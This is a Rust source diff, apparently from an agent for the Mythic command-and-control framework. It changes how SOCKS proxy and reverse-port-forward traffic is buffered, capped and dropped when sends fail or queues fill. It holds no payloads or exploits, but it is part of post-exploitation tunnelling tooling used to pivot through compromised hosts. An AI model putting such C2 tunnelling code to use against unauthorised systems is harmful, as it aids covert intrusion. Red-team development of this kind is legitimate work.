@@ -169,7 +169,19 @@ pub fn drain_poll_buffer() -> MythicMessage {
 }
 
 /// Re-buffer a MythicMessage that failed to send, so its contents aren't lost.
-pub fn buffer_failed_message(msg: MythicMessage) {
+/// SOCKS and RPFWD data is intentionally dropped — it's ephemeral stream data
+/// and re-buffering it can create an infinite loop of oversized messages.
+pub fn buffer_failed_message(mut msg: MythicMessage) {
+    let socks_count = msg.socks.as_ref().map_or(0, |s| s.len());
+    let rpfwd_count = msg.rpfwds.as_ref().map_or(0, |r| r.len());
+    if socks_count > 0 || rpfwd_count > 0 {
+        crate::utils::print_debug(&format!(
+            "Dropping {} socks + {} rpfwd messages on send failure (ephemeral)",
+            socks_count, rpfwd_count
+        ));
+    }
+    msg.socks = None;
+    msg.rpfwds = None;
     buffer_message(msg);
 }
 
@@ -199,6 +211,10 @@ fn buffer_message(msg: MythicMessage) {
         buf.rpfwds.extend(rpfwds);
     }
 }
+
+/// Maximum number of SOCKS/RPFWD messages to include per poll cycle.
+/// Prevents oversized messages that could hit CloudFront/proxy payload limits.
+const MAX_SOCKS_PER_POLL: usize = 200;
 
 /// Create a MythicMessage for polling, draining all buffered data
 fn create_mythic_poll_message(buffer: &mut ResponseBuffer) -> MythicMessage {
@@ -248,11 +264,15 @@ fn create_mythic_poll_message(buffer: &mut ResponseBuffer) -> MythicMessage {
     }
 
     if !buffer.socks.is_empty() {
-        msg.socks = Some(buffer.socks.drain(..).collect());
+        let count = std::cmp::min(buffer.socks.len(), MAX_SOCKS_PER_POLL);
+        let drained: Vec<_> = buffer.socks.drain(..count).collect();
+        msg.socks = Some(drained);
     }
 
     if !buffer.rpfwds.is_empty() {
-        msg.rpfwds = Some(buffer.rpfwds.drain(..).collect());
+        let count = std::cmp::min(buffer.rpfwds.len(), MAX_SOCKS_PER_POLL);
+        let drained: Vec<_> = buffer.rpfwds.drain(..count).collect();
+        msg.rpfwds = Some(drained);
     }
 
     msg
@@ -353,9 +373,28 @@ async fn listen_for_socks_traffic_to_mythic(
     get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
 ) {
     while let Some(socks) = rx.recv().await {
-        let mut msg = MythicMessage::new_get_tasking();
-        msg.socks = Some(vec![socks]);
-        try_push_or_buffer(msg, get_push_channel).await;
+        if let Some(push_tx) = get_push_channel() {
+            // Push-based: send directly with timeout, drop if full
+            let mut msg = MythicMessage::new_get_tasking();
+            msg.socks = Some(vec![socks]);
+            if tokio::time::timeout(
+                std::time::Duration::from_secs(1),
+                push_tx.send(msg),
+            )
+            .await
+            .is_err()
+            {
+                crate::utils::print_debug("Dropping socks push data (channel full/timeout)");
+            }
+        } else {
+            // Poll-based: buffer with back-pressure (drop if buffer too large)
+            let mut buf = POLL_BUFFER.lock().unwrap();
+            if buf.socks.len() < 2000 {
+                buf.socks.push(socks);
+            } else {
+                crate::utils::print_debug("Dropping socks data (buffer full)");
+            }
+        }
     }
 }
 
@@ -364,9 +403,28 @@ async fn listen_for_rpfwd_traffic_to_mythic(
     get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
 ) {
     while let Some(rpfwd) = rx.recv().await {
-        let mut msg = MythicMessage::new_get_tasking();
-        msg.rpfwds = Some(vec![rpfwd]);
-        try_push_or_buffer(msg, get_push_channel).await;
+        if let Some(push_tx) = get_push_channel() {
+            // Push-based: send directly with timeout, drop if full
+            let mut msg = MythicMessage::new_get_tasking();
+            msg.rpfwds = Some(vec![rpfwd]);
+            if tokio::time::timeout(
+                std::time::Duration::from_secs(1),
+                push_tx.send(msg),
+            )
+            .await
+            .is_err()
+            {
+                crate::utils::print_debug("Dropping rpfwd push data (channel full/timeout)");
+            }
+        } else {
+            // Poll-based: buffer with back-pressure (drop if buffer too large)
+            let mut buf = POLL_BUFFER.lock().unwrap();
+            if buf.rpfwds.len() < 2000 {
+                buf.rpfwds.push(rpfwd);
+            } else {
+                crate::utils::print_debug("Dropping rpfwd data (buffer full)");
+            }
+        }
     }
 }
 
